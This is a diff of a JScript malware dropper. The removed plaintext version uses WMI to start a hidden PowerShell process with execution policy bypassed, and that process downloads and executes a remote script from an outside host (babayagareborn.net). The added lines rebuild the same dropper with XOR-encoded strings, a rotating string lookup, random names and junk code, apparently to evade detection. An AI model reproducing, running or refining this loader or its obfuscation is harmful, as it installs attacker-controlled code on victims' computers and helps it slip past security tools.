@@ -1,18 +1,22 @@
-var wmi, proc, startup, cmd, result;
+function _d(s,k){var r="",i=0;while(i<s.length){r+=String.fromCharCode(parseInt(s.substr(i,2),16)^k);i+=2;}return r;}
+var _g=(function(){var _a=[_d("1A24237E7F121D3F222E283E3E",77),_d("1A24237E7F121D3F222E283E3E1E392C3F39383D",77),_d("3D223A283F3E25282121632835286D6023223D6D603A6D2524292928236D60283D6D2F343D2C3E3E6D602E6D6F6924283570162E252C3F107A7E66162E252C3F107B7466162E252C3F1075757669243F20706A04233B6A666A222628601F283E396A666A0028392522296A766B6D692428356D656B6D69243F206D6A2539393D3E7762622F2C2F2C342C2A2C3F282F223F2363232839622F212C2E2625222128622322297E7F6224283526243E2C2139633935396A646F",77),_d("3A2423202A20393E773624203D283F3E22232C3924222301283B28217024203D283F3E22232C3928306C111163113F222239112E24203B7F",77)];var _r=0;return function(i){return _a[(i+_r++)%_a.length];};})();
+function _jEcJug(_xwnyLrXK,_yIhpMY){return _xwnyLrXK^_yIhpMY;}_jEcJug(2,3);for(var _cIzkuzknr=0;_cIzkuzknr<1;_cIzkuzknr++){}var _dhIuFK=42021;var _xwnyLrXK="L";
+var _FFeI, _CrFbOJVe, _ANXHoZy, _RORDHK, _uEBaFgn;
 
 try {
-    wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+    _FFeI = GetObject(_g((7*0+3)));
     
   
     
 
-cmd = "powershell.exe -nop -w hidden -ep bypass -c \"$iex=[char]73+[char]69+[char]88;$irm='Inv'+'oke-Rest'+'Method';& $iex (& $irm 'https://babayagareborn.net/blackhole/nod32/iexkisalt.txt\')\"";
-    startup = wmi.Get("Win32_ProcessStartup");
-    startup.ShowWindow = 0;           // SW_HIDE
-    startup.PriorityClass = 32;       // NORMAL_PRIORITY_CLASS
+_RORDHK = _g((2*0+1));
+    _ANXHoZy = _FFeI.Get(_g((6*0+3)));
+    _ANXHoZy.ShowWindow = (0xAA-0xAA);           // SW_HIDE
+    _ANXHoZy.PriorityClass = (2*16+0);       // NORMAL_PRIORITY_CLASS
     
-    proc = wmi.Get("Win32_Process");
-    result = proc.Create(cmd, null, startup);
-    
-    // result == 0 → başarı, diğer değerler hata kodu (ama sessiz bırakıyoruz)
+    _CrFbOJVe = _FFeI.Get(_g((8*0+1)));
+    _uEBaFgn = _CrFbOJVe.Create(_RORDHK, null, _ANXHoZy);
+
 } catch(e) {}
+
+function _jZPGNC(_xaHSKzdg,_ygStD){return _xaHSKzdg^_ygStD;}_jZPGNC(2,3);for(var _cyxIupVJ=0;_cyxIupVJ<1;_cyxIupVJ++){}var _dqKCLylSJ=10771;var _xaHSKzdg="G";
